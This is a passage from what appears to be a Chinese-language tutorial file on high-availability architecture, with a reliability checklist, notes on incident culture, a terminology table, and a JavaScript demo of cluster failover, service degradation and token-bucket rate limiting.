11. ☐ 是否有降级预案？
12. ☐ 是否有重试+退避？
13. ☐ 是否所有调用都有超时？

**数据层**：

14. ☐ DB 是否主从+自动切换？
15. ☐ 缓存是否集群+故障转移？
16. ☐ 是否有数据备份？
17. ☐ 备份是否验证可恢复？
18. ☐ 是否有慢查询监控？
19. ☐ 是否有主从延迟监控？

**运维层**：

20. ☐ 是否有全链路监控？
21. ☐ 是否有告警分级？
22. ☐ 告警是否降噪？
23. ☐ 是否有自动化运维脚本？
24. ☐ 是否有故障切换脚本？
25. ☐ 是否有回滚脚本？
26. ☐ 发布是否自动化（CI/CD）？
27. ☐ 发布是否支持金丝雀？

**容灾层**：

28. ☐ RTO 是否达标？
29. ☐ RPO 是否达标？
30. ☐ 是否定期演练容灾切换？
31. ☐ 是否做了混沌工程？
32. ☐ 是否有故障复盘机制？

**安全层**：

33. ☐ 是否有 DDoS 防护？
34. ☐ 是否有 WAF？
35. ☐ 是否有速率限制防刷？
36. ☐ 密钥是否轮转？
37. ☐ 是否有审计日志？

**性能层**：

38. ☐ 是否做了全链路压测？
39. ☐ 是否有性能基线？
40. ☐ 是否有慢请求监控？
41. ☐ 是否有资源水位监控？

**依赖层**：

42. ☐ 第三方依赖是否有降级？
43. ☐ 是否评估过依赖的可用性？
44. ☐ 是否有多供应商方案？

**文档层**：

45. ☐ 是否有架构文档？
46. ☐ 是否有故障处理 SOP？
47. ☐ 是否有值班排班？
48. ☐ 是否有应急联系人？
49. ☐ 是否有变更记录？
50. ☐ 是否定期 Review 架构？

这份 checklist 不是一次做完，而是持续迭代。每次故障后补充新发现的问题。高可用是"持续工程"，不是"一次性项目"。

---

## 附录 P：高可用文化

技术之外，高可用更是一种文化：

1. **对事不对人**：故障复盘不追责，找系统问题。追责会让人隐瞒问题。
2. **鼓励暴露问题**：发现隐患要奖励，而非惩罚。问题藏着才会爆发。
3. **默认信任**：相信同事尽力了，故障是系统漏洞不是人偷懒。
4. **持续学习**：每次故障都是教材，分享给全员。
5. **实战演练**：定期混沌工程，让"故障"成为日常。
6. **数据驱动**：用 SLI/SLO 说话，不靠感觉。
7. **预留 buffer**：不追求 100% 利用率，留余量应对突发。
8. **简单优于复杂**：复杂系统更易出故障，能简则简。

Google SRE 有一句话："Hope is not a strategy."（希望不是策略）。高可用不能靠运气，要靠架构、流程、文化的系统建设。

把高可用当成产品来打磨——它不是"做完了"就结束，而是持续演进。每次故障、每次大促、每次架构升级，都是高可用能力的一次校验和提升。

最终，高可用是一种"工程素养"——让系统在不确定的世界中，提供确定的服务。

---

## 附录 Q：高可用术语速查表

| 术语 | 全称 | 含义 |
|------|------|------|
| SLI | Service Level Indicator | 服务水平指标，如可用性、延迟 |
| SLO | Service Level Objective | 服务水平目标，如 99.95% 可用 |
| SLA | Service Level Agreement | 服务水平协议，对外承诺+赔偿 |
| MTBF | Mean Time Between Failures | 平均故障间隔时间 |
| MTTR | Mean Time To Repair | 平均恢复时间 |
| MTTF | Mean Time To Failure | 平均无故障时间 |
| RTO | Recovery Time Objective | 恢复时间目标（业务可容忍的中断时长） |
| RPO | Recovery Point Objective | 恢复点目标（可容忍的数据丢失量） |
| SPOF | Single Point of Failure | 单点故障 |
| Quorum | - | 多数派（N/2+1），用于一致性和防脑裂 |
| Failover | - | 故障转移，主挂后自动切到备 |
| Fencing | - | 隔离，防止脑裂时旧主继续写 |
| Graceful Degradation | - | 优雅降级，核心功能保留，非核心关闭 |
| Circuit Breaker | - | 熔断器，下游故障时快速失败 |
| Rate Limiting | - | 限流，过载保护 |
| Bulkhead | - | 舱壁隔离，资源分组防扩散 |
| Chaos Engineering | - | 混沌工程，主动注入故障验证韧性 |
| Canary Release | - | 金丝雀发布，小流量验证再全量 |
| Blue-Green Deploy | - | 蓝绿部署，两套环境切换 |
| Rolling Update | - | 滚动更新，逐批替换 |
| VIP | Virtual IP | 虚拟 IP，Keepalived 漂移 |
| VRRP | Virtual Router Redundancy Protocol | 虚拟路由冗余协议 |
| ISR | In-Sync Replicas | 同步副本集（Kafka） |
| MGR | MySQL Group Replication | MySQL 组复制 |
| MHA | MySQL Master High Availability | MySQL 主从高可用工具 |
| CRDT | Conflict-free Replicated Data Type | 无冲突复制数据类型 |

掌握这些术语，阅读高可用相关文档和论文会顺畅很多。高可用的知识体系很大，但核心思想始终是：**假设一切都会失败，然后为每一种失败做好准备**。`,
    code: `// ============================================================
// 高可用架构 —— 可运行示例
// 实现集群故障转移 + 降级保护 + 令牌桶限流
// ============================================================

// ---------- 1. 节点 ----------
class Node {
  constructor(id, role = 'follower') {
    this.id = id;
    this.role = role;
    this.alive = true;
    this.lastHeartbeat = Date.now();
    this.failCount = 0;
  }
  heartbeat() { this.lastHeartbeat = Date.now(); this.failCount = 0; }
  fail() { this.alive = false; }
  revive() { this.alive = true; this.failCount = 0; this.heartbeat(); }
}

// ---------- 2. 集群（多节点 + 心跳 + 选举 + 脑裂检测） ----------
class Cluster {
  constructor(size) {
    this.nodes = [];
    this.leader = null;
    this.quorum = Math.floor(size / 2) + 1;  // 多数派
    for (let i = 0; i < size; i++) this.nodes.push(new Node('node-' + (i + 1)));
    this.electLeader();
  }

  electLeader() {
    const alive = this.nodes.filter(n => n.alive);
    if (alive.length < this.quorum) {
      console.log('  [脑裂警告] 存活节点 ' + alive.length + ' < 法定人数 ' + this.quorum + '，拒绝选举');
      this.leader = null;
      return false;
    }
    this.leader = alive[0];
    this.leader.role = 'leader';
    alive.slice(1).forEach(n => n.role = 'follower');
    console.log('  选举新 Leader: ' + this.leader.id + ' (存活 ' + alive.length + '/' + this.nodes.length + ')');
    return true;
  }

  checkHealth() {
    const now = Date.now();
    for (const n of this.nodes) {
      if (!n.alive) continue;
      if (now - n.lastHeartbeat > 5000) {
        n.failCount++;
        if (n.failCount >= 3) {
          console.log('  [故障检测] ' + n.id + ' 心跳超时，标记为宕机');
          n.fail();
          if (n === this.leader) {
            console.log('  [Leader 宕机] 触发故障转移...');
            this.electLeader();
          }
        }
      }
    }
  }

  killNode(nodeId) {
    const n = this.nodes.find(x => x.id === nodeId);
    if (n) {
      n.fail();
      console.log('  ' + nodeId + ' 被强制宕机');
      if (n === this.leader) {
        console.log('  [Leader 宕机] 触发故障转移...');
        this.electLeader();
      }
    }
  }

  aliveCount() { return this.nodes.filter(n => n.alive).length; }
}

// ---------- 3. VIP 漂移模拟 ----------
class VIPFailover {
  constructor(cluster) {
    this.cluster = cluster;
    this.vipHolder = cluster.leader ? cluster.leader.id : null;
  }
  update() {
    if (this.cluster.leader && this.vipHolder !== this.cluster.leader.id) {
      this.vipHolder = this.cluster.leader.id;
      console.log('  [VIP 漂移] VIP 绑定到 ' + this.vipHolder + '，流量已切换');
    }
  }
}

// ---------- 4. 降级管理器 ----------
class DegradationManager {
  constructor() { this.services = new Map(); }
  register(name, fallback) { this.services.set(name, { degraded: false, fallback }); }
  degrade(name) {
    const s = this.services.get(name);
    if (s && !s.degraded) {
      s.degraded = true;
      console.log('  [降级] ' + name + ' 已降级，使用兜底: ' + s.fallback);
    }
  }
  recover(name) {
    const s = this.services.get(name);
    if (s && s.degraded) { s.degraded = false; console.log('  [恢复] ' + name + ' 降级已解除'); }
  }
  isDegraded(name) { return this.services.get(name)?.degraded; }
  handle(name) {
    const s = this.services.get(name);
    return s?.degraded ? s.fallback : '正常响应';
  }
}

// ---------- 5. 令牌桶限流 ----------
class TokenBucket {
  constructor(capacity, refillRate) {
    this.capacity = capacity;
    this.refillRate = refillRate;
    this.tokens = capacity;
    this.lastRefill = Date.now();
  }
  _refill() {
    const now = Date.now();
    const elapsed = (now - this.lastRefill) / 1000;
    this.tokens = Math.min(this.capacity, this.tokens + elapsed * this.refillRate);
    this.lastRefill = now;
  }
  allow() {
    this._refill();
    if (this.tokens >= 1) { this.tokens--; return true; }
    return false;
  }
}

// ---------- 6. 演示 ----------
console.log('===== 1. 集群初始化（5 节点，quorum=3）=====');
const cluster = new Cluster(5);
const vip = new VIPFailover(cluster);

console.log('\\n===== 2. 模拟 Leader 宕机，故障转移 =====');
const oldLeader = cluster.leader.id;
cluster.killNode(oldLeader);
vip.update();

console.log('\\n===== 3. 模拟脑裂（杀到只剩 2 个）=====');
cluster.killNode('node-2');
cluster.killNode('node-3');
console.log('  存活节点: ' + cluster.aliveCount() + '/5');
cluster.electLeader();

console.log('\\n===== 4. 恢复节点，重新选举 =====');
cluster.nodes.find(n => n.id === 'node-3').revive();
console.log('  node-3 恢复，存活: ' + cluster.aliveCount() + '/5');
cluster.electLeader();
vip.update();

console.log('\\n===== 5. 降级保护演示 =====');
const dm = new DegradationManager();
dm.register('recommend-service', '返回热门商品');
dm.register('comment-service', '返回空列表');
dm.register('order-service', '核心服务不降级');
console.log('  用户请求推荐: ' + dm.handle('recommend-service'));
dm.degrade('recommend-service');
console.log('  用户请求推荐（降级后）: ' + dm.handle('recommend-service'));
console.log('  用户请求下单: ' + dm.handle('order-service'));

console.log('\\n===== 6. 令牌桶限流保护 =====');
const bucket = new TokenBucket(10, 5);
console.log('  限流配置: 容量=10, 补充=5/s');
let allowed = 0, rejected = 0;
for (let i = 0; i < 20; i++) { if (bucket.allow()) allowed++; else rejected++; }
console.log('  突发 20 请求: 放行 ' + allowed + ', 拒绝 ' + rejected + '（保护系统不超载）');

console.log('\\n===== 7. 完整故障场景演练 =====');
console.log('  场景: 大促流量洪峰 + 推荐服务宕机');
dm.degrade('comment-service');
let orderAllowed = 0, orderRejected = 0;
const orderBucket = new TokenBucket(100, 100);
for (let i = 0; i < 150; i++) { if (orderBucket.allow()) orderAllowed++; else orderRejected++; }
console.log('  下单请求 150: 放行 ' + orderAllowed + ', 限流 ' + orderRejected);
dm.recover('recommend-service');
dm.recover('comment-service');
console.log('  系统恢复正常，降级全部解除');

console.log('\\n===== 演示结束 =====');
`,
  },
  // __APPEND_CHAPTERS_HERE__
];